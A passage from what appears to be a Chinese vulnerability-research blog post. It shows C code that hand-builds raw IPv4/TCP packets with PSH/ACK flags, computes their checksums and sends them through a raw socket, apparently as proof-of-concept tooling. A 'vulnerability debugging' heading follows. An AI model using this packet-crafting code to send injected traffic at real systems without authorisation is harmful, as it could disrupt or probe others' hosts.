class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TCP header</span></span><br><span class="line">    <span class="comment">// Source port number (16 bits)</span></span><br><span class="line">    tcphdr.th_sport = htons(<span class="number">60</span>);</span><br><span class="line">    <span class="comment">// Destination port number (16 bits)</span></span><br><span class="line">    tcphdr.th_dport = htons(<span class="number">80</span>);</span><br><span class="line">    <span class="comment">// Sequence number (32 bits)</span></span><br><span class="line">    tcphdr.th_seq = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Acknowledgement number (32 bits)</span></span><br><span class="line">    tcphdr.th_ack = htonl(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Reserved (4 bits): should be 0</span></span><br><span class="line">    tcphdr.th_x2 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Data offset (4 bits): size of TCP header in 32-bit words</span></span><br><span class="line">    tcphdr.th_off = TCP_HDRLEN / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flags (8 bits)</span></span><br><span class="line">    <span class="comment">// FIN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// SYN flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// RST flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// PSH flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// ACK flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// URG flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ECE flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// CWR flag (1 bit)</span></span><br><span class="line">    tcp_flags[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    tcphdr.th_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        tcphdr.th_flags += (tcp_flags[i] &lt;&lt; i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Window size (16 bits)</span></span><br><span class="line">    tcphdr.th_win = htons(<span class="number">65535</span>);</span><br><span class="line">    <span class="comment">// Urgent pointer (16 bits): 0 (only valid if URG flag is set)</span></span><br><span class="line">    tcphdr.th_urp = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// TCP checksum (16 bits)</span></span><br><span class="line">    tcphdr.th_sum =</span><br><span class="line">            tcp4_checksum(iphdr, tcphdr, (<span class="type">uint8_t</span> *)payload, payloadlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Next part of packet is upper layer protocol header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), &amp;tcphdr, TCP_HDRLEN * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN + TCP_HDRLEN), payload,</span><br><span class="line">           payloadlen * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to set IP_HDRINCL &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to bind to interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (<span class="keyword">struct</span> sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sendto() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">    <span class="built_in">free</span>(payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Computing the internet checksum (RFC 1071).</span></span><br><span class="line"><span class="comment">// Note that the internet checksum does not preclude collisions.</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">checksum</span><span class="params">(<span class="type">uint16_t</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = len;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint16_t</span> answer = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sum up 2-byte values until none or only one byte left.</span></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *(addr++);</span><br><span class="line">        count -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add left-over byte, if any.</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += *(<span class="type">uint8_t</span> *)addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fold 32-bit sum into 16 bits; we lose information by doing this,</span></span><br><span class="line">    <span class="comment">// increasing the chances of a collision.</span></span><br><span class="line">    <span class="comment">// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)</span></span><br><span class="line">    <span class="keyword">while</span> (sum &gt;&gt; <span class="number">16</span>) &#123;</span><br><span class="line">        sum = (sum &amp; <span class="number">0xffff</span>) + (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checksum is one&#x27;s compliment of sum.</span></span><br><span class="line">    answer = ~sum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 ICMP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">icmp4_checksum</span><span class="params">(<span class="keyword">struct</span> icmp icmphdr, <span class="type">uint8_t</span> *payload, <span class="type">int</span> payloadlen)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">    <span class="type">int</span> chksumlen = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>]; <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Type to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_type, <span class="keyword">sizeof</span>(icmphdr.icmp_type));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Message Code to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_code, <span class="keyword">sizeof</span>(icmphdr.icmp_code));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_code);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ICMP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don&#x27;t know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Identifier to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_id, <span class="keyword">sizeof</span>(icmphdr.icmp_id));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Sequence Number to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;icmphdr.icmp_seq, <span class="keyword">sizeof</span>(icmphdr.icmp_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(icmphdr.icmp_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="type">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Build IPv4 TCP pseudo-header and call checksum function.</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">tcp4_checksum</span><span class="params">(<span class="keyword">struct</span> ip iphdr, <span class="keyword">struct</span> tcphdr tcphdr, <span class="type">uint8_t</span> *payload,</span></span><br><span class="line"><span class="params">                       <span class="type">int</span> payloadlen)</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> svalue;</span><br><span class="line">    <span class="type">char</span> buf[IP_MAXPACKET], cvalue;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">    <span class="type">int</span> i, chksumlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ptr points to beginning of buffer buf</span></span><br><span class="line">    ptr = &amp;buf[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy source IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_src.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_src.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy destination IP address into buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_dst.s_addr, <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_dst.s_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy zero field to buf (8 bits)</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy transport layer protocol to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_p, <span class="keyword">sizeof</span>(iphdr.ip_p));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP length to buf (16 bits)</span></span><br><span class="line">    svalue = htons(<span class="keyword">sizeof</span>(tcphdr) + payloadlen);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;svalue, <span class="keyword">sizeof</span>(svalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP source port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_sport, <span class="keyword">sizeof</span>(tcphdr.th_sport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP destination port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_dport, <span class="keyword">sizeof</span>(tcphdr.th_dport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy sequence number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_seq, <span class="keyword">sizeof</span>(tcphdr.th_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy acknowledgement number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_ack, <span class="keyword">sizeof</span>(tcphdr.th_ack));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy data offset to buf (4 bits) and</span></span><br><span class="line">    <span class="comment">// copy reserved bits to buf (4 bits)</span></span><br><span class="line">    cvalue = (tcphdr.th_off &lt;&lt; <span class="number">4</span>) + tcphdr.th_x2;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;cvalue, <span class="keyword">sizeof</span>(cvalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP flags to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_flags, <span class="keyword">sizeof</span>(tcphdr.th_flags));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP window size to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_win, <span class="keyword">sizeof</span>(tcphdr.th_win));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don&#x27;t know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy urgent pointer to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_urp, <span class="keyword">sizeof</span>(tcphdr.th_urp));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="type">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of chars.</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">allocate_strmem</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;ERROR: Cannot allocate memory because len = %i in &quot;</span></span><br><span class="line">                   <span class="string">&quot;allocate_strmem().\n&quot;</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="type">char</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">                <span class="string">&quot;ERROR: Cannot allocate memory for array allocate_strmem().\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of unsigned chars.</span></span><br><span class="line"><span class="type">uint8_t</span> *<span class="title function_">allocate_ustrmem</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;ERROR: Cannot allocate memory because len = %i in &quot;</span></span><br><span class="line">                   <span class="string">&quot;allocate_ustrmem().\n&quot;</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">                <span class="string">&quot;ERROR: Cannot allocate memory for array allocate_ustrmem().\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of ints.</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">allocate_intmem</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;ERROR: Cannot allocate memory because len = %i in &quot;</span></span><br><span class="line">                   <span class="string">&quot;allocate_intmem().\n&quot;</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="type">int</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">                <span class="string">&quot;ERROR: Cannot allocate memory for array allocate_intmem().\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buff[<span class="number">17</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *pc = (<span class="type">unsigned</span> <span class="type">char</span> *)addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output description if given.</span></span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s:\n&quot;</span>, desc);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  ZERO LENGTH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  NEGATIVE LENGTH: %i\n&quot;</span>, len);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process every byte in the data.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// Multiple of 16 means new line (with line offset).</span></span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Just don&#x27;t print ASCII for the zeroth line.</span></span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;  %s\n&quot;</span>, buff);</span><br><span class="line">            <span class="comment">// Output the offset.</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %04x &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Now the hex code for the specific character.</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %02x&quot;</span>, pc[i]);</span><br><span class="line">        <span class="comment">// And store a printable ASCII character for later.</span></span><br><span class="line">        <span class="keyword">if</span> ((pc[i] &lt; <span class="number">0x20</span>) || (pc[i] &gt; <span class="number">0x7e</span>))</span><br><span class="line">            buff[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            buff[i % <span class="number">16</span>] = pc[i];</span><br><span class="line">        buff[(i % <span class="number">16</span>) + <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Pad out last line if not exactly 16 characters.</span></span><br><span class="line">    <span class="keyword">while</span> ((i % <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// And print the final ASCII bit.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  %s\n&quot;</span>, buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" 